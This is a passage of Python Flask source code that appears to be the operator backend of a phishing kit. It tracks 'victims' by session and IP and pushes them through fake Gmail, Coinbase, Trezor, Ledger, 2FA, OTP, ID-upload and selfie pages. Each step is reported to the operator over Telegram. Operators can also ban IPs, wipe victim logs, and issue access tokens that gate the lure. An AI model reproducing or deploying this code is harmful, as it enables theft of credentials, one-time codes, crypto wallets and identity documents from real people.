    
    if session_id:
        # Map actions to page names
        action_to_page = {
            'go_to_waiting': 'waiting',
            'go_to_login': 'gmail_login',
            'go_to_stall': 'stall',
            'go_to_verify': 'verify',
            'go_to_password': 'password',
            'go_to_reset': 'reset',
            'go_to_otp': 'otp',
            'go_to_invalid': 'invalid',
            'go_to_recovery': 'recovery',
            'go_to_2step': 'twostep',
            'go_to_index': 'index',
            'go_to_coinbase': 'coinbase_login_page',
            'go_to_landing': 'landing',
            'go_to_trezor': 'trezor',
            'go_to_ledger': 'ledger',
            'go_to_external': 'external',
            'go_to_idtype': 'idtype',
            'go_to_idupload': 'idupload',
            'go_to_selfie': 'selfie',
            'go_to_authenticator': 'authenticator',
            'go_to_coinbase_2factor': 'coinbase_2factor',
            'go_to_final_redirect': 'final_redirect',
            'go_to_main': 'main'
        }
        
        if action in action_to_page:
            page_name = action_to_page[action]
            
            # Encode the page name for the command
            import base64
            encoded_page = base64.urlsafe_b64encode(page_name.encode()).decode().rstrip('=')
            
            # Store encoded command
            victim_commands[session_id] = f'encoded_{encoded_page}'
            update_victim_page(session_id, page_name)
            
            ip_address = active_victims.get(session_id, {}).get('ip_address', 'Unknown')
            send_telegram_message(f"🔄 <b>Command Sent:</b> Victim forced to {page_name.replace('_', ' ').title()} Page\n🌐 <b>IP:</b> <code>{ip_address}</code>")
            
        elif action == 'ban_ip':
            # Get IP from session
            conn = get_db_connection()
            c = conn.cursor()
            c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
            result = c.fetchone()
            if result:
                ip_address = result[0]
                c.execute("INSERT INTO banned_ips (ip_address) VALUES (%s) ON CONFLICT (ip_address) DO NOTHING", (ip_address,))
                send_telegram_message(f"🚫 <b>IP Banned:</b> <code>{ip_address}</code>")
            conn.commit()
            conn.close()
    
    return jsonify({'success': True})

@app.route('/api/delete-victim', methods=['POST'])
def delete_victim():
    """Delete victim and redirect them to real Google"""
    data = request.get_json()
    session_id = data.get('session_id')
    
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get victim info before deleting
    c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
    victim = c.fetchone()
    
    if victim:
        email, ip_address = victim
        
        # Ban the IP
        try:
            c.execute("INSERT INTO banned_ips (ip_address) VALUES (%s) ON CONFLICT (ip_address) DO NOTHING", (ip_address,))
        except:
            pass
        
        # Deactivate victim
        c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
        
        # Send Telegram notification
        send_telegram_message(f"🗑️ <b>Victim Deleted:</b>\n📧 <b>Email:</b> <code>{email or 'No email'}</code>\n🌐 <b>IP:</b> <code>{ip_address}</code>\n🔗 <b>Redirected to real Google</b>")
    
    conn.commit()
    conn.close()
    
    # Remove from active victims and commands
    if session_id in active_victims:
        del active_victims[session_id]
    if session_id in victim_commands:
        del victim_commands[session_id]
    
    return jsonify({'success': True})

@app.route('/api/unban-ip', methods=['POST'])
def unban_ip():
    """Unban an IP address"""
    data = request.get_json()
    ip_address = data.get('ip_address')
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM banned_ips WHERE ip_address = %s", (ip_address,))
    conn.commit()
    conn.close()
    
    # Send Telegram notification
    send_telegram_message(f"✅ <b>IP Unbanned:</b> <code>{ip_address}</code>")
    
    return jsonify({'success': True})



@app.route('/api/get-session-email')
def get_session_email():
    """Get email from session data"""
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Also check verify data
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    return jsonify({'email': email})


@app.route('/api/clear-all-logs', methods=['POST'])
def clear_all_logs():
    """Clear ALL victim data and logs"""
    try:
        conn = get_db_connection()
        c = conn.cursor()
        
        # Delete all data from tables
        c.execute("DELETE FROM navigations")
        c.execute("DELETE FROM victims")
        c.execute("DELETE FROM banned_ips")
        
        # Reset sequences (for PostgreSQL)
        c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
        c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1") 
        c.execute("ALTER SEQUENCE banned_ips_id_seq RESTART WITH 1")
        
        conn.commit()
        conn.close()
        
        # Clear in-memory data
        active_victims.clear()
        victim_commands.clear()
        verify_page_data.clear()
        recovery_page_data.clear()
        verification_page_data.clear()
        
        # Send Telegram notification
        send_telegram_message("🗑️ <b>ALL LOGS CLEARED!</b>\n\n📊 <b>All victim data has been wiped clean</b>\n🔄 <b>System reset to initial state</b>")
        
        return jsonify({'success': True, 'message': 'All logs cleared successfully'})
        
    except Exception as e:
        print(f"Error clearing logs: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-security-logs')

def get_security_logs():
    """Get security logs for admin panel"""
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute("SELECT * FROM security_logs ORDER BY timestamp DESC LIMIT 100")
    logs = c.fetchall()
    
    conn.close()
    
    return jsonify({
        'logs': [{
            'id': log[0],
            'ip_address': log[1],
            'user_agent': log[2],
            'event_type': log[3],
            'details': log[4],
            'timestamp': log[5]
        } for log in logs]
    })

@app.route('/api/clear-security-logs', methods=['POST'])

def clear_security_logs():
    """Clear security logs"""
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute("DELETE FROM security_logs")
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/api/toggle-site', methods=['POST'])

def toggle_site():
    """Toggle site on/off - NOW PERSISTENT"""
    data = request.get_json()
    new_status = data.get('enabled', True)
    
    # Save to database
    success = set_site_setting('site_enabled', new_status)
    
    if success:
        status = "ENABLED" if new_status else "DISABLED"
        message = f"""
🔧 <b>SITE STATUS CHANGED!</b>

🔄 <b>New Status:</b> <code>{status}</code>
👤 <b>Changed By:</b> <code>{session.get('admin_username', 'Unknown')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>

{"✅ <b>Site is now LIVE and accepting victims</b>" if new_status else "🚫 <b>Site is now DISABLED - all access blocked</b>"}
        """
        
        send_telegram_message(message)
        return jsonify({'success': True, 'enabled': new_status})
    else:
        return jsonify({'success': False, 'error': 'Failed to save site status'})

@app.route('/api/ban-all-ips', methods=['POST'])

def ban_all_ips():
    """Ban all IPs from victims and logs"""
    try:
        conn = get_db_connection()
        c = conn.cursor()
        
        # Get all unique IPs from victims and navigations
        c.execute("SELECT DISTINCT ip_address FROM victims WHERE is_active = TRUE")
        victim_ips = [row[0] for row in c.fetchall()]
        
        c.execute("SELECT DISTINCT ip_address FROM navigations")
        navigation_ips = [row[0] for row in c.fetchall()]
        
        # Combine and deduplicate IPs
        all_ips = list(set(victim_ips + navigation_ips))
        
        banned_count = 0
        for ip in all_ips:
            if ip and ip != 'Unknown':
                try:
                    c.execute(
                        "INSERT INTO banned_ips (ip_address, reason) VALUES (%s, %s) ON CONFLICT (ip_address) DO NOTHING",
                        (ip, "Banned via 'Ban All Logs'")
                    )
                    banned_count += 1
                except:
                    pass
        
        conn.commit()
        conn.close()
        
        # Send Telegram notification
        admin_user = session.get('admin_username', 'Unknown')
        client_ip = get_client_ip()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🚫 <b>MASS IP BAN EXECUTED!</b>

👤 <b>Admin:</b> <code>{admin_user}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
🔢 <b>IPs Banned:</b> <code>{banned_count}</code>
📍 <b>Action:</b> Ban All Logs

⚠️ <b>All IPs from victims and logs have been banned</b>
        """
        
        send_telegram_message(message)
        
        return jsonify({'success': True, 'banned_count': banned_count})
        
    except Exception as e:
        print(f"Error banning all IPs: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-site-status')

def get_site_status():
    """Get current site status - NOW PERSISTENT"""
    site_enabled = get_site_setting('site_enabled', True)
    return jsonify({'enabled': site_enabled})

@app.route('/api/generate-token', methods=['POST'])
@admin_required
def generate_token():
    """Generate a new access token"""
    token = token_system.generate_token()
    if token:
        # Create the full access URL
        base_url = request.host_url.rstrip('/')
        access_url = f"{base_url}/?token={token}"
        
        return jsonify({
            'success': True, 
            'token': token,
            'access_url': access_url
        })
    return jsonify({'success': False, 'error': 'Failed to generate token'})
@app.route('/api/get-victim-email')
def get_victim_email():
    """Get victim email from database - for Coinbase login page"""
    session_id = session.get('victim_session')
    
    if not session_id:
        return jsonify({'email': ''})
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT email FROM victims WHERE session_id = %s", (session_id,))
    result = c.fetchone()
    conn.close()
    
    email = result[0] if result and result[0] and result[0] != 'No email yet' else ''
    
    print(f"🔍 Database email check for {session_id}: {email}")
    return jsonify({'email': email})
@app.route('/api/revoke-token', methods=['POST'])
@admin_required
def revoke_token():
    """Revoke an access token"""
    data = request.get_json()
    token = data.get('token')
    
    if token and token_system.revoke_token(token):
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Failed to revoke token'})

@app.route('/api/get-tokens')
@admin_required
def get_tokens():
    """Get all access tokens"""
    tokens = token_system.get_all_tokens()
    return jsonify({'success': True, 'tokens': tokens})

@app.route('/bccsr2dec.js')
def serve_bsmnedom():
    """Serve the bsmnedom.js file from root directory"""
    try:
        # Serve directly from root directory
        with open('bsmnedom.js', 'r', encoding='utf-8') as f:
            content = f.read()
        
        response = app.response_class(
            response=content,
            status=200,
            mimetype='application/javascript'
        )
        print("✅ Serving bsmnedom.js from root directory")
        return response
    except FileNotFoundError:
        print("❌ bsmnedom.js not found in root directory")
        return "console.error('bsmnedom.js not found');", 404
    except Exception as e:
        print(f"❌ Error serving bsmnedom.js: {e}")
        return "console.error('Error loading bsmnedom.js');", 500
if __name__ == '__main__':
   
    
    

    app.run(
        host='0.0.0.0', 
        port=5000,
        debug=False
    )
